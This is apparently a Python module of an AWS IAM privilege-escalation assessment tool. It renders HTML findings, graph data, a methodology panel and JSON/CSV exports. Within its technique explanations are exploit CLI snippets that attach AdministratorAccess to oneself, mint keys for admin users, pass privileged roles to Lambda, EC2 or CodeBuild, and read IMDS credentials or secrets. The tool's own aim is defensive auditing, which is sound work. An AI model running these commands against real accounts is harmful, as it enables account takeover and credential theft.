    def _render_query_card(cls, title: str, desc: str, results: List[Dict], color: str, category: str = "") -> str:
        """Render a query result card with copy functionality and detailed explanations."""
        users = [r for r in results if r.get("type") == "user"]
        roles = [r for r in results if r.get("type") == "role"]
        all_arns = [r.get("principal", r.get("arn", "")) for r in results]
        arns_json = json.dumps(all_arns).replace("'", "\\'")

        query_explanations = {
            "Administrative Principals": {
                "what": "IAM principals with AdministratorAccess or equivalent full permissions",
                "why": "Admin principals are high-value targets. Compromise of any admin credential = full account takeover.",
                "check": "Verify each admin is necessary. Consider using permission boundaries even for admins."
            },
            "Privilege Escalation": {
                "what": "Non-admin principals who can escalate to admin through one or more steps",
                "why": "These are 'shadow admins' - they appear limited but can reach full access. Often overlooked in security reviews.",
                "check": "Each of these principals is effectively an admin and should be treated as such."
            },
            "Secrets Access": {
                "what": "Principals who can read secrets from Secrets Manager or SSM Parameter Store",
                "why": "Secrets often contain database credentials, API keys, or other sensitive data that enables lateral movement.",
                "check": "Review what secrets these principals can access and whether that access is necessary."
            },
            "SSM Lateral Movement": {
                "what": "Principals who can use SSM to execute commands on or access EC2 instances",
                "why": "SSM provides remote shell access without needing SSH keys. Can be used for lateral movement to instances with more permissions.",
                "check": "Restrict ssm:SendCommand and ssm:StartSession to specific instances."
            },
            "Cross-Account Access": {
                "what": "Roles that can be assumed by principals from external AWS accounts",
                "why": "Cross-account trusts expand your attack surface beyond your account boundary. Weak trusts can be exploited.",
                "check": "Verify each external trust is necessary and has proper ExternalId conditions."
            }
        }

        explanation = query_explanations.get(title, {
            "what": desc,
            "why": "These principals have potentially dangerous permissions.",
            "check": "Review and apply least-privilege principles."
        })

        cat_attr = f' data-category="{category}"' if category else ''
        html = f"""
        <div class="query-card"{cat_attr}>
            <div class="query-card-header">
                <div class="query-card-title">{cls._escape(title)}</div>
                <div style="display:flex;align-items:center;gap:12px">
                    <button class="copy-btn" onclick="copyAllArns({arns_json})" title="Copy all ARNs">Copy All</button>
                    <div class="query-card-count">{len(results)}</div>
                </div>
            </div>
            <div class="query-card-desc">{cls._escape(explanation["what"])}</div>
            <div class="query-card-why"><strong>Why it matters:</strong> {cls._escape(explanation["why"])}</div>
            <div class="query-card-body">
        """

        if users:
            html += '<div class="query-group"><span class="query-group-label">&#9632; Users</span>'
            for u in users[:10]:
                admin_tag = ' <span class="query-admin-tag">ADMIN</span>' if u.get("is_admin") else ''
                arn = u.get("principal", u.get("arn", ""))
                arn_escaped = cls._escape(arn).replace("'", "\\'")
                html += f'<span class="query-principal user" data-arn="{cls._escape(arn)}" onclick="copyArn(\'{arn_escaped}\')" title="Click to copy: {cls._escape(arn)}">{cls._escape(u["name"])}{admin_tag}</span>'
            if len(users) > 10:
                html += f'<span class="query-principal more">+{len(users)-10} more</span>'
            html += '</div>'

        if roles:
            html += '<div class="query-group"><span class="query-group-label">&#9670; Roles</span>'
            for r in roles[:10]:
                admin_tag = ' <span class="query-admin-tag">ADMIN</span>' if r.get("is_admin") else ''
                arn = r.get("principal", r.get("arn", ""))
                arn_escaped = cls._escape(arn).replace("'", "\\'")
                html += f'<span class="query-principal role" data-arn="{cls._escape(arn)}" onclick="copyArn(\'{arn_escaped}\')" title="Click to copy: {cls._escape(arn)}">{cls._escape(r["name"])}{admin_tag}</span>'
            if len(roles) > 10:
                html += f'<span class="query-principal more">+{len(roles)-10} more</span>'
            html += '</div>'

        html += """
            </div>
        </div>
        """
        return html

    @classmethod
    def _render_query_mini_card(cls, action: str, title: str, count: int, samples: List[Dict]) -> str:
        """Render a mini query card for action-based queries."""
        sample_names = ", ".join(s["name"] for s in samples[:3])
        if len(samples) > 3:
            sample_names += f" +{len(samples)-3}"

        severity_class = "critical" if count > 5 else "high" if count > 2 else "medium" if count > 0 else "low"

        return f"""
        <div class="query-mini-card">
            <div class="query-mini-header">
                <code class="query-action">{cls._escape(action)}</code>
                <span class="badge {severity_class}">{count}</span>
            </div>
            <div class="query-mini-title">{cls._escape(title)}</div>
            <div class="query-mini-samples">{cls._escape(sample_names) if sample_names else "None"}</div>
        </div>
        """

    @classmethod
    def _render_escalation_paths(cls, paths: List[EscalationPath], prefix: str) -> str:
        """Render escalation paths grouped by technique with detailed explanations and CLI commands."""
        techniques = defaultdict(list)
        for path in paths:
            techniques[path.technique].append(path)

        fid = f"{prefix}_paths"

        technique_explanations = {
            "Direct STS AssumeRole": {
                "what": "The attacker can directly assume a privileged IAM role using their current credentials.",
                "why": "Trust policies allow the source principal to call sts:AssumeRole on the target role. This grants immediate access to the role's permissions without any additional steps.",
                "impact": "Instant privilege escalation to the target role's full permission set.",
                "verify_cli": "aws sts assume-role --role-arn <TARGET_ROLE_ARN> --role-session-name test-escalation",
                "exploit_cli": "# After assuming the role, use the temporary credentials:\nexport AWS_ACCESS_KEY_ID=<AccessKeyId>\nexport AWS_SECRET_ACCESS_KEY=<SecretAccessKey>\nexport AWS_SESSION_TOKEN=<SessionToken>\naws sts get-caller-identity  # Verify you're now the target role"
            },
            "Lambda Function Abuse": {
                "what": "The attacker can create or modify Lambda functions that execute with a privileged role.",
                "why": "Having lambda:CreateFunction/UpdateFunctionCode with iam:PassRole allows creating functions that run with elevated privileges. The Lambda service assumes the execution role.",
                "impact": "Code execution in the context of privileged roles, enabling arbitrary AWS API calls.",
                "verify_cli": "aws lambda list-functions --query 'Functions[*].[FunctionName,Role]'\naws iam simulate-principal-policy --policy-source-arn <YOUR_ARN> --action-names lambda:CreateFunction iam:PassRole",
                "exploit_cli": "# Create a malicious Lambda that exfiltrates role credentials:\naws lambda create-function --function-name exploit-func \\\n  --runtime python3.9 --role <PRIVILEGED_ROLE_ARN> \\\n  --handler index.handler --zip-file fileb://exploit.zip\naws lambda invoke --function-name exploit-func output.txt"
            },
            "EC2 Instance Profile": {
                "what": "The attacker can launch EC2 instances with privileged instance profiles attached.",
                "why": "ec2:RunInstances combined with iam:PassRole allows launching instances that inherit IAM role permissions via the instance metadata service.",
                "impact": "Persistent access to privileged credentials via IMDS, code execution on the instance.",
                "verify_cli": "aws ec2 describe-iam-instance-profile-associations\naws iam list-instance-profiles --query 'InstanceProfiles[*].[InstanceProfileName,Roles[0].Arn]'",
                "exploit_cli": "# Launch an instance with a privileged profile:\naws ec2 run-instances --image-id ami-xxx --instance-type t2.micro \\\n  --iam-instance-profile Name=<PRIVILEGED_PROFILE> \\\n  --user-data '#!/bin/bash\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>'"
            },
            "Policy Attachment": {
                "what": "The attacker can attach administrator policies to themselves or other principals.",
                "why": "Permissions like iam:AttachUserPolicy, iam:AttachRolePolicy, or iam:PutUserPolicy allow modifying IAM policies, granting arbitrary permissions.",
                "impact": "Full administrative access by self-escalation.",
                "verify_cli": "aws iam simulate-principal-policy --policy-source-arn <YOUR_ARN> \\\n  --action-names iam:AttachUserPolicy iam:AttachRolePolicy iam:PutUserPolicy",
                "exploit_cli": "# Attach AdministratorAccess to yourself:\naws iam attach-user-policy --user-name <YOUR_USER> \\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n# Or create an inline policy:\naws iam put-user-policy --user-name <YOUR_USER> --policy-name AdminAccess \\\n  --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}'"
            },
            "Access Key Creation": {
                "what": "The attacker can create access keys for other IAM users.",
                "why": "iam:CreateAccessKey permission without resource restrictions allows generating credentials for any user, including administrators.",
                "impact": "Persistent access to compromised user accounts via long-term credentials.",
                "verify_cli": "aws iam simulate-principal-policy --policy-source-arn <YOUR_ARN> \\\n  --action-names iam:CreateAccessKey --resource-arns '*'",
                "exploit_cli": "# Create access keys for an admin user:\naws iam create-access-key --user-name <ADMIN_USER>\n# Use the new credentials:\nexport AWS_ACCESS_KEY_ID=<NewAccessKeyId>\nexport AWS_SECRET_ACCESS_KEY=<NewSecretAccessKey>\naws sts get-caller-identity"
            },
            "CodeBuild Project Abuse": {
                "what": "The attacker can create CodeBuild projects that execute with privileged service roles.",
                "why": "codebuild:CreateProject with iam:PassRole enables creating build projects that run arbitrary code with elevated permissions.",
                "impact": "Code execution with the CodeBuild service role's permissions.",
                "verify_cli": "aws codebuild list-projects\naws iam list-roles --query 'Roles[?contains(AssumeRolePolicyDocument.Statement[0].Principal.Service, `codebuild`)].[RoleName,Arn]'",
                "exploit_cli": "# Create a CodeBuild project with a privileged role:\naws codebuild create-project --name exploit-build \\\n  --source type=NO_SOURCE,buildspec='version: 0.2\\nphases:\\n  build:\\n    commands:\\n      - aws sts get-caller-identity\\n      - aws s3 ls' \\\n  --environment type=LINUX_CONTAINER,image=aws/codebuild/standard:5.0,computeType=BUILD_GENERAL1_SMALL \\\n  --service-role <PRIVILEGED_ROLE_ARN>\naws codebuild start-build --project-name exploit-build"
            },
            "SSM/Secrets Access": {
                "what": "The attacker can read secrets or execute commands on EC2 instances via SSM.",
                "why": "secretsmanager:GetSecretValue or ssm:GetParameter can expose stored credentials. ssm:SendCommand enables remote command execution on managed instances.",
                "impact": "Credential theft, lateral movement to EC2 instances.",
                "verify_cli": "aws secretsmanager list-secrets\naws ssm describe-parameters\naws ssm describe-instance-information",
                "exploit_cli": "# Retrieve a secret:\naws secretsmanager get-secret-value --secret-id <SECRET_NAME>\n# Or SSM parameters:\naws ssm get-parameter --name <PARAM_NAME> --with-decryption\n# Execute commands on EC2:\naws ssm send-command --instance-ids <INSTANCE_ID> \\\n  --document-name AWS-RunShellScript \\\n  --parameters commands=['curl http://169.254.169.254/latest/meta-data/iam/security-credentials/']"
            },
        }

        html = f"""
            <div class="finding" id="f-{fid}">
                <div class="finding-header" onclick="toggleFinding('{fid}')">
                    <div class="finding-header-left">
                        <span class="finding-chevron" id="fc-{fid}">&#9654;</span>
                        <span class="finding-title">Privilege Escalation Paths ({len(paths)} total)</span>
                    </div>
                    <span class="badge critical">Critical</span>
                </div>
                <div class="finding-body" id="fb-{fid}">
"""

        for technique, tech_paths in sorted(techniques.items(), key=lambda x: -len(x[1])):
            tech_info = technique_explanations.get(technique, {
                "what": f"Escalation via {technique}",
                "why": "This technique allows the attacker to gain elevated privileges.",
                "impact": "Privilege escalation to administrative access.",
                "verify_cli": "# Verify your current permissions\naws sts get-caller-identity",
                "exploit_cli": "# Exploitation depends on the specific path"
            })

            html += f'''
            <div class="finding-section">
                <h4>{cls._escape(technique)} <span class="badge high" style="font-size:10px;padding:2px 6px;margin-left:8px">{len(tech_paths)}</span></h4>
                <p style="color:var(--tx2);font-size:13px;margin-bottom:12px">{cls._escape(tech_info["what"])}</p>
                <div class="table-wrapper">
                <table class="escalation-table">
                    <thead>
                        <tr>
                            <th style="width:22%">Source</th>
                            <th style="width:40%">Attack Chain</th>
                            <th style="width:22%">Target</th>
                            <th style="width:8%">Hops</th>
                            <th style="width:8%">Risk</th>
                        </tr>
                    </thead>
                    <tbody>
            '''

            for path in tech_paths[:10]:
                chain_parts = []
                for hop in path.hops:
                    action = hop.short_reason if hop.short_reason else hop.reason[:50]
                    chain_parts.append(action)

                if len(path.hops) > 1:
                    chain_html = ""
                    for i, hop in enumerate(path.hops):
                        action = hop.short_reason if hop.short_reason else hop.reason[:40]
                        chain_html += f'<span style="color:var(--hi)">{cls._escape(action)}</span>'
                        if i < len(path.hops) - 1:
                            dest_name = hop.target.split("/")[-1] if "/" in hop.target else hop.target.split(":")[-1]
                            chain_html += f' <span style="color:var(--tx2)">→</span> <span style="color:var(--olive)">{cls._escape(dest_name)}</span> <span style="color:var(--tx2)">→</span> '
                else:
                    action = path.hops[0].short_reason if path.hops else technique
                    chain_html = f'<span style="color:var(--hi)">{cls._escape(action)}</span>'

                hop_count = len(path.hops)
                hop_badge_color = "var(--cr)" if hop_count == 1 else "var(--hi)" if hop_count == 2 else "var(--olive)"

                html += f"""
                        <tr>
                            <td><code style="font-size:11px">{cls._escape(path.source.name)}</code><br><span style="font-size:10px;color:var(--tx2)">{path.source.principal_type}</span></td>
                            <td style="font-size:11px;line-height:1.6">{chain_html}</td>
                            <td><code style="font-size:11px;color:var(--cr)">{cls._escape(path.target.name)}</code><br><span style="font-size:10px;color:var(--cr)">ADMIN</span></td>
                            <td style="text-align:center"><span style="color:{hop_badge_color};font-weight:600">{hop_count}</span></td>
                            <td><span class="badge {path.severity}" style="font-size:10px;padding:2px 6px">{path.severity[:4]}</span></td>
                        </tr>
"""

            html += """
                    </tbody>
                </table>
                </div>
            """

            if len(tech_paths) > 10:
                html += f'<p style="color:var(--tx2);font-size:11px;margin-top:8px">+{len(tech_paths) - 10} more paths</p>'

            verify_cli = tech_info.get("verify_cli", "")
            exploit_cli = tech_info.get("exploit_cli", "")
            combined_cli = ""
            if verify_cli:
                combined_cli += verify_cli
            if exploit_cli:
                if combined_cli:
                    combined_cli += "\n\n"
                combined_cli += exploit_cli

            if combined_cli:
                html += f'''
                <details style="margin-top:12px">
                    <summary style="cursor:pointer;color:var(--hi);font-size:12px;font-weight:500">Commands</summary>
                    <div class="cli-block" style="margin-top:8px">
                        <div class="cli-block-header">
                            <button class="copy-btn" onclick="copyText(this)">Copy</button>
                        </div>
                        <div class="cli-code">{cls._syntax_highlight_cli(combined_cli)}</div>
                    </div>
                </details>
            '''

            html += '</div>'

        html += """
                    <div class="finding-section">
                        <h4>Remediation</h4>
                        <ul style="margin:0 0 0 16px;font-size:13px;line-height:1.8;color:var(--tx2)">
                            <li><strong style="color:var(--tx)">Restrict iam:PassRole</strong> to specific role ARNs</li>
                            <li><strong style="color:var(--tx)">Add conditions to sts:AssumeRole</strong> (MFA, source IP)</li>
                            <li><strong style="color:var(--tx)">Scope compute permissions</strong> (Lambda, EC2, CodeBuild) to specific resources</li>
                            <li><strong style="color:var(--tx)">Use permission boundaries</strong> to cap maximum privileges</li>
                        </ul>
                    </div>
                </div>
            </div>
"""
        return html

    @classmethod
    def _render_trust_table(cls, trusts: List[CrossAccountTrust], prefix: str) -> str:
        """Render cross-account trust relationships table."""
        fid = f"{prefix}_trusts"

        html = f"""
            <div class="finding" id="f-{fid}">
                <div class="finding-header" onclick="toggleFinding('{fid}')">
                    <div class="finding-header-left">
                        <span class="finding-chevron" id="fc-{fid}">&#9654;</span>
                        <span class="finding-title">Cross-Account Trust Relationships ({len(trusts)})</span>
                    </div>
                    <span class="badge medium">Review</span>
                </div>
                <div class="finding-body" id="fb-{fid}">
                    <div class="finding-section">
                        <h4>Trust Policy Analysis</h4>
                        <table class="trust-table">
                            <thead>
                                <tr>
                                    <th>Role</th>
                                    <th>Trusted Principal</th>
                                    <th>External ID</th>
                                    <th>Risk</th>
                                </tr>
                            </thead>
                            <tbody>
"""

        for trust in trusts[:20]:
            ext_id = "Yes" if trust.has_external_id else "<span style='color:var(--cr)'>No</span>"
            html += f"""
                                <tr>
                                    <td><code>{cls._escape(trust.role_name)}</code></td>
                                    <td><code>{cls._escape(trust.trusted_principal[:50])}</code></td>
                                    <td>{ext_id}</td>
                                    <td><span class="badge {trust.risk_level}">{trust.risk_level}</span></td>
                                </tr>
"""

        html += """
                            </tbody>
                        </table>
                    </div>
                    <div class="finding-section">
                        <h4>Remediation</h4>
                        <div class="remediation-box">
                            <p>For cross-account trusts without ExternalId:</p>
                            <pre>{
    "Condition": {
        "StringEquals": {
            "sts:ExternalId": "YOUR_UNIQUE_ID"
        }
    }
}</pre>
                        </div>
                    </div>
                </div>
            </div>
"""
        return html

    @classmethod
    def _generate_policy_scripts(cls, analyses: List[AccountAnalysis]) -> str:
        """Generate JavaScript to register all policies for the policy viewer."""
        scripts = []
        seen_policies = set()

        for analysis in analyses:
            for policy_arn, policy in analysis.policies.items():
                if policy_arn in seen_policies:
                    continue
                seen_policies.add(policy_arn)

                policy_doc = {
                    "Version": "2012-10-17",
                    "Statement": []
                }

                for stmt in policy.statements:
                    statement = {
                        "Effect": stmt.effect,
                        "Action": stmt.actions,
                        "Resource": stmt.resources,
                    }
                    if stmt.conditions:
                        statement["Condition"] = stmt.conditions
                    if stmt.principals:
                        statement["Principal"] = stmt.principals
                    policy_doc["Statement"].append(statement)

                dangerous_in_policy = []
                for stmt in policy.statements:
                    for action in stmt.actions:
                        if action in DANGEROUS_ACTIONS or action == "*" or action.endswith(":*"):
                            dangerous_in_policy.append(action)

                policy_json_str = json.dumps(policy_doc)
                issues_json = json.dumps(dangerous_in_policy)

                scripts.append(
                    f"registerPolicy({json.dumps(policy_arn)}, {policy_json_str}, {issues_json});"
                )

        if not scripts:
            return ""

        return "<script>\n" + "\n".join(scripts) + "\n</script>"

    @classmethod
    def _build_graph_data(cls, analyses: List[AccountAnalysis]) -> Dict:
        """Convert analyses to Cytoscape.js graph format.

        The graph shows the REAL 1-hop relationships (analysis.edges), deduplicated.
        It does NOT synthesize direct source->admin edges per escalation path: those
        fabricate relationships that do not exist and inflate the edge count (e.g. 38
        real edges rendered as 83). Escalation reachability is conveyed via node
        metadata (paths_to_admin) and the client-side path highlighting, which walks
        the real topology.
        """
        nodes = []
        edges = []
        node_ids = set()
        edge_keys = set()
        edge_id = 0

        def label_for(arn):
            return arn.split("/")[-1] if "/" in arn else arn.split(":")[-1]

        for analysis in analyses:
            shadow_arns = {p.arn for p in analysis.shadow_admins}
            src_path_counts = defaultdict(int)
            for p in analysis.escalation_paths:
                src_path_counts[p.source.arn] += 1

            def ensure_node(arn, principal=None):
                if arn in node_ids:
                    return
                node_ids.add(arn)
                if principal is not None:
                    if principal.is_admin:
                        node_type = "admin"
                    elif arn in shadow_arns:
                        node_type = "shadow"
                    elif principal.principal_type in ("user", "role", "group"):
                        node_type = principal.principal_type
                    else:
                        node_type = "role"
                    pta = src_path_counts.get(arn, 0)
                    nodes.append({"data": {
                        "id": arn, "label": principal.name, "arn": arn,
                        "type": node_type, "is_admin": principal.is_admin,
                        "paths_to_admin": pta if pta > 0 else None,
                        "account": analysis.account_id,
                    }})
                else:
                    nodes.append({"data": {
                        "id": arn, "label": label_for(arn), "arn": arn,
                        "type": "role", "is_admin": False,
                    }})

            for arn, principal in analysis.principals.items():
                ensure_node(arn, principal)

            admin_arns = {arn for arn, p in analysis.principals.items() if p.is_admin}
            for edge in analysis.edges:
                key = f"{edge.source}->{edge.target}"
                if key in edge_keys:
                    continue
                edge_keys.add(key)
                ensure_node(edge.source)
                ensure_node(edge.target)

                reason_l = (edge.reason or "").lower()
                if edge.target in admin_arns:
                    severity = "critical"
                elif any(k in reason_l for k in ["passrole", "assume", "attach", "putrole", "putuser", "createaccesskey"]):
                    severity = "high"
                elif any(k in reason_l for k in ["lambda", "ec2", "codebuild", "cloudformation", "glue", "sagemaker"]):
                    severity = "high"
                else:
                    severity = "medium"

                edges.append({"data": {
                    "id": f"e{edge_id}",
                    "source": edge.source, "target": edge.target,
                    "source_name": label_for(edge.source),
                    "target_name": label_for(edge.target),
                    "reason": edge.short_reason or (edge.reason[:80] if edge.reason else "access"),
                    "severity": severity,
                }})
                edge_id += 1

        return {"nodes": nodes, "edges": edges}

    @classmethod
    def _render_methodology(cls) -> str:
        """State what the analysis engine DOES and does NOT evaluate.

        Essential for an assessment deliverable: it sets the scope/validity boundary so
        the security team does not over-claim. IAM effective-permission evaluation is
        subtle; a static graph tool cannot replicate the full AWS evaluator.
        """
        does = [
            "Identity policies: attached (customer + resolved AWS-managed), inline, and group-inherited",
            "Explicit Deny (broad, unconditional) is subtracted from Allow; NotAction is expanded",
            "Permissions boundaries: intersected when the body is available, otherwise the principal is flagged as boundary-capped",
            "Trust policies: AWS, Federated (SAML/OIDC incl. GitHub Actions), and Service principals; ExternalId enforcement is verified, not just presence",
            "Credential hygiene: MFA, console password, and long-term access keys",
        ]
        does_not = [
            "Service Control Policies (SCPs) and Resource Control Policies (RCPs) - org guardrails are NOT modeled; a finding may be capped by an SCP",
            "Resource-based policies (S3 bucket / KMS key / SNS policies) and session policies",
            "Runtime condition evaluation (source IP, aws:PrincipalTag, time) - conditions are noted, not simulated",
            "Resource-level scoping for every action in 'who can do X' (IAM escalation actions ARE resource-checked; others are action-level)",
            "AWS-managed policy bodies not in the built-in catalog (flagged per-principal as 'unresolved' so capabilities are not silently understated)",
            "Access-key AGE and last-used, and unused permissions (collect from an IAM credential report / Access Analyzer to complete the assessment)",
        ]
        does_html = "".join(f"<li>{cls._escape(x)}</li>" for x in does)
        does_not_html = "".join(f"<li>{cls._escape(x)}</li>" for x in does_not)
        return f'''
            <div class="run-info" style="margin-top:16px">
                <div class="run-info-header">
                    <div class="run-info-title">Methodology &amp; Limitations</div>
                    <div class="run-info-badge">read before reporting</div>
                </div>
                <div class="finding-grid" style="padding:4px 2px 2px">
                    <div class="finding-section">
                        <h4 style="color:var(--ok)">What this analysis evaluates</h4>
                        <ul style="margin:0 0 0 16px;font-size:12px;line-height:1.7;color:var(--tx2)">{does_html}</ul>
                    </div>
                    <div class="finding-section">
                        <h4 style="color:var(--hi)">What it does NOT evaluate (validate before reporting)</h4>
                        <ul style="margin:0 0 0 16px;font-size:12px;line-height:1.7;color:var(--tx2)">{does_not_html}</ul>
                    </div>
                </div>
                <p style="font-size:11px;color:var(--tx2);padding:0 4px 4px">
                    Findings are derived from a static PMapper graph. Confirm each finding against the live account
                    (IAM policy simulator, credential report, Access Analyzer) before including it in a deliverable.
                </p>
            </div>'''

    @classmethod
    def _render_run_info(cls, metadata: RunMetadata) -> str:
        """Render the run info panel for the dashboard."""
        regions_html = ""
        if metadata.regions_used:
            region_mode = "Auto-detected" if metadata.auto_detected_regions else "Included"
            regions_html = f"""
                <div class="run-info-item" style="grid-column: span 2">
                    <div class="run-info-label">Regions ({region_mode})</div>
                    <div class="run-info-regions" id="regions-list">
                        {''.join(f'<span class="run-info-region">{cls._escape(r)}</span>' for r in metadata.regions_used[:8])}
                        {f'<span class="run-info-toggle" onclick="toggleRegions()">+{len(metadata.regions_used) - 8} more</span>' if len(metadata.regions_used) > 8 else ''}
                    </div>
                    <div class="run-info-regions" id="regions-full" style="display:none">
                        {''.join(f'<span class="run-info-region">{cls._escape(r)}</span>' for r in metadata.regions_used)}
                        <span class="run-info-toggle" onclick="toggleRegions()">show less</span>
                    </div>
                </div>"""
        elif metadata.regions_excluded:
            regions_html = f"""
                <div class="run-info-item" style="grid-column: span 2">
                    <div class="run-info-label">Excluded Regions</div>
                    <div class="run-info-regions">
                        {''.join(f'<span class="run-info-region excluded">{cls._escape(r)}</span>' for r in metadata.regions_excluded)}
                    </div>
                </div>"""

        source_html = ""
        if metadata.profiles:
            source_html = f"""
                <div class="run-info-item">
                    <div class="run-info-label">AWS Profile(s)</div>
                    <div class="run-info-value highlight">{', '.join(cls._escape(p) for p in metadata.profiles)}</div>
                </div>"""
        elif metadata.input_paths:
            source_html = f"""
                <div class="run-info-item">
                    <div class="run-info-label">Input Path(s)</div>
                    <div class="run-info-value">{', '.join(cls._escape(str(p)) for p in metadata.input_paths)}</div>
                </div>"""

        return f"""
            <div class="run-info">
                <div class="run-info-header">
                    <div class="run-info-title">Run Information</div>
                    <div class="run-info-badge">v{cls._escape(metadata.tool_version)}</div>
                </div>
                <div class="run-info-grid">
                    {source_html}
                    <div class="run-info-item">
                        <div class="run-info-label">Output Directory</div>
                        <div class="run-info-value">{cls._escape(metadata.output_directory) if metadata.output_directory else 'N/A'}</div>
                    </div>
                    <div class="run-info-item">
                        <div class="run-info-label">Export Formats</div>
                        <div class="run-info-value">{', '.join(metadata.output_formats) if metadata.output_formats else 'html'}</div>
                    </div>
                    <div class="run-info-item">
                        <div class="run-info-label">Timestamp</div>
                        <div class="run-info-value">{cls._escape(metadata.run_timestamp)}</div>
                    </div>
                    {regions_html}
                </div>
            </div>
            <script>
            function toggleRegions() {{
                const list = document.getElementById('regions-list');
                const full = document.getElementById('regions-full');
                if (list.style.display === 'none') {{
                    list.style.display = 'flex';
                    full.style.display = 'none';
                }} else {{
                    list.style.display = 'none';
                    full.style.display = 'flex';
                }}
            }}
            </script>
        """

    @staticmethod
    def _escape(s: str) -> str:
        """HTML escape."""
        return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")

    @staticmethod
    def _escape_js(s: str) -> str:
        """Escape for JS template literal string inside HTML attribute."""
        return (s.replace("\\", "\\\\")
                 .replace("'", "\\'")
                 .replace("\n", "\\n")
                 .replace("`", "\\`")
                 .replace("$", "\\$")
                 .replace("<", "\\x3c")
                 .replace(">", "\\x3e"))

    @classmethod
    def _syntax_highlight_cli(cls, code: str) -> str:
        """Apply simple, clean syntax highlighting to AWS CLI commands."""
        lines = code.split('\n')
        highlighted_lines = []

        for line_num, line in enumerate(lines, 1):
            ln = f'<span class="ln">{line_num:2}</span>'

            if not line.strip():
                highlighted_lines.append(ln)
                continue

            stripped = line.lstrip()
            if stripped.startswith('#'):
                indent = cls._escape(line[:len(line) - len(stripped)])
                highlighted_lines.append(f'{ln}{indent}<span class="comment">{cls._escape(stripped)}</span>')
                continue

            escaped = cls._escape(line)

            escaped = re.sub(
                r'^(\s*)(aws)(\s+)([a-z0-9-]+)',
                r'\1<span class="cmd">\2</span>\3<span class="subcmd">\4</span>',
                escaped
            )

            escaped = re.sub(
                r'^(\s*)(cat|echo|export|curl|jq|grep|cut|head|tail|awk|sed)(\s)',
                r'\1<span class="builtin">\2</span>\3',
                escaped
            )

            escaped = re.sub(r'(\s)(--[a-zA-Z][a-zA-Z0-9-]*)(\s|=|$)', r'\1<span class="flag">\2</span>\3', escaped)
            escaped = re.sub(r'(\s)(-[a-zA-Z])(\s)', r'\1<span class="flag">\2</span>\3', escaped)

            escaped = re.sub(r'(arn:aws:[a-z0-9:/_-]+)', r'<span class="arn">\1</span>', escaped)

            escaped = re.sub(r'(&lt;[A-Z][A-Z0-9_]*&gt;)', r'<span class="var">\1</span>', escaped)

            escaped = re.sub(r'(\$[A-Za-z_][A-Za-z0-9_]*)', r'<span class="var">\1</span>', escaped)

            escaped = re.sub(r'(file://[^\s&]+)', r'<span class="path">\1</span>', escaped)

            highlighted_lines.append(f'{ln}{escaped}')

        return '\n'.join(highlighted_lines)


class JSONExporter:
    """Export analysis results to JSON."""

    @staticmethod
    def export(analyses: List[AccountAnalysis], output_path: Path):
        """Export all analyses to a single JSON file."""
        output = {
            "generated_at": datetime.now().isoformat(),
            "tool": "privmapper_advanced",
            "version": "1.0.0",
            "accounts": [],
        }

        for analysis in analyses:
            account_data = {
                "account_id": analysis.account_id,
                "summary": {
                    "nodes": analysis.node_count,
                    "edges": analysis.edge_count,
                    "admins": analysis.admin_count,
                    "explicit_admins": len([p for p in analysis.principals.values()
                                            if p.is_admin and not any(re.search(pat, p.name) for pat in AWS_MANAGED_PATTERNS)]),
                    "aws_managed_admins": len(analysis.aws_managed_admins),
                    "shadow_admins": len(analysis.shadow_admins),
                    "overly_permissive": len(analysis.overly_permissive),
                    "escalation_paths": len(analysis.escalation_paths),
                    "cross_account_trusts": len(analysis.cross_account_trusts),
                    "credential_hygiene_issues": len(analysis.credential_hygiene),
                },
                "findings": [asdict(f) for f in analysis.findings],
                "escalation_paths": [
                    {
                        "source": p.source.arn,
                        "target": p.target.arn,
                        "technique": p.technique,
                        "risk_score": p.risk_score,
                        "severity": p.severity,
                        "complexity": p.complexity,
                        "exposure": p.exposure,
                        "blast_radius": p.blast_radius,
                        "mitre_techniques": p.mitre_techniques,
                        "attack_narrative": p.attack_narrative,
                        "hops": [{"source": h.source, "target": h.target,
                                 "reason": h.reason} for h in p.hops],
                    }
                    for p in analysis.escalation_paths
                ],
                "cross_account_trusts": [asdict(t) for t in analysis.cross_account_trusts],
                "credential_hygiene": analysis.credential_hygiene,
            }
            output["accounts"].append(account_data)

        with open(output_path, "w") as f:
            json.dump(output, f, indent=2)

        print(f"[+] JSON exported: {output_path}")


class CSVExporter:
    """Export analysis results to CSV."""

    FIELDS = ["account_id", "finding_id", "title", "severity", "category", "cvss",
              "principal", "risk_score", "evidence", "impact", "remediation"]

    @staticmethod
    def export(analyses: List[AccountAnalysis], output_path: Path):
        """Export findings to CSV with assessment substance (CVSS, risk score, evidence)."""
        rows = []

        for analysis in analyses:
            for finding in analysis.findings:
                fkey = finding.id.split("_", 1)[-1] if "_" in finding.id else finding.category
                guidance = get_exploitation_guidance(fkey)
                cvss = guidance.get("cvss_vector", guidance.get("cvss_estimate", ""))
                ev_by_arn = {}
                for pd in finding.details.get("principals_detail", []):
                    ev = pd.get("evidence", [])
                    if ev:
                        ev_by_arn[pd.get("arn")] = "; ".join(
                            f"{e['action']}<-{e.get('policy_name','')}" for e in ev[:4])
                for principal in finding.principals:
                    rows.append({
                        "account_id": analysis.account_id,
                        "finding_id": finding.id,
                        "title": finding.title,
                        "severity": finding.severity,
                        "category": finding.category,
                        "cvss": cvss,
                        "principal": principal,
                        "risk_score": "",
                        "evidence": ev_by_arn.get(principal, guidance.get("evidence", "")),
                        "impact": finding.impact,
                        "remediation": finding.remediation,
                    })

            for path in analysis.escalation_paths:
                chain = " -> ".join(
                    [path.source.name] +
                    [(h.short_reason or h.reason[:40]) for h in path.hops] +
                    [path.target.name])
                rows.append({
                    "account_id": analysis.account_id,
                    "finding_id": f"{analysis.account_id}_escalation_{path.source.name}_{path.target.name}",
                    "title": f"Escalation: {path.source.name} -> {path.target.name} ({path.technique})",
                    "severity": path.severity,
                    "category": "privesc",
                    "cvss": CVSS_VECTORS.get("privesc", ""),
                    "principal": path.source.arn,
                    "risk_score": path.risk_score,
                    "evidence": chain,
                    "impact": f"Can escalate to {path.target.name} via {path.technique}",
                    "remediation": RemediationEngine.get_path_remediation(path)["fix"],
                })

        if rows:
            with open(output_path, "w", newline="") as f:
                writer = csv.DictWriter(f, fieldnames=CSVExporter.FIELDS)
                writer.writeheader()
                writer.writerows(rows)

